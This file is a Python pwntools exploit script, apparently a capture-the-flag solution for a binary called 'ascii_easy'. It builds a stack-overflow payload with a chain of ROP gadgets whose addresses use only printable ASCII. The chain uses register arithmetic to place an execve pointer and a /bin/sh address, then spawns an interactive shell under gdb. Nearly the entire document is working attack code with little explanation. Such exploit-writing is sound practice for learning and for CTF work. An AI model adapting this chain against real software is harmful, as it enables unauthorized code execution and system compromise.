from pwn import *

payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A" #junk
payload += b"B" * 4 # ebp overflow

# 0x555f3555 pop edx; xor eax,eax; pop edi; ret
# just move the seat aka stack grooming
payload += p32(0x555f3555) # move target address to edx
payload += p32(0x5556682b)
payload += b"A" * 4

# write execve address to edx
payload += p32(0x555f3555) # move target address to edx
payload += p32(0x5556682b)
payload += b"A" * 4

# 0x556d2a51 pop ecx; add al,0xa; ret
# 0x556d382a add DWORD PTR [edx],ecx
payload += p32(0x556d2a51) # prepare ecx
payload += p32(0x2A303270)
payload += p32(0x556d382a) # add ecx to [edx]
payload += p32(0x556d2a51) # prepare ecx
payload += p32(0x2B313370)
payload += p32(0x556d382a) # add ecx to [edx] -> [edx] = 0x2A303270 + 0x2B313370 = 0x556165e0

# 0x556a7c60 xor eax,eax; pop edi; ret
# 0x555f3d4d sub eax,edi; pop esi; pop edi; ret
# write /bin/sh address to eax
payload += p32(0x556a7c60) # prepare eax
payload += p32(0x40307060)
payload += p32(0x555f3d4d) # fix eax step 1
payload += b"A" *4
payload += p32(0x40307060)
payload += p32(0x555f3d4d) # fix eax step 2
payload += b"A" * 4
payload += p32(0x2A336754)
payload += p32(0x555f3d4d) # fix eax step 3
payload += b"A" * 4
payload += b"A" * 4

# adjustments

payload += p32(0x556a7740) # pop 3 registers (0x556a7740: pop edi; pop esi; pop ebx; ret; )
payload += p32(0x556a7740) # will be popped into edi - 0x556a7740: pop edi; pop esi; pop ebx; ret;
payload += b"B" * 4 # to be popped into esi
payload += p32(0x556e4042) # 0x556e4042 : pop ebx; bnd jmp [edx] we need to have a preceding pop since we have to get rid of the stack content

# push all registers
payload += p32(0x556c683c)

print(payload)

# p = process(['./ascii_easy', payload])
p = gdb.debug(['./ascii_easy', payload])
p.interactive()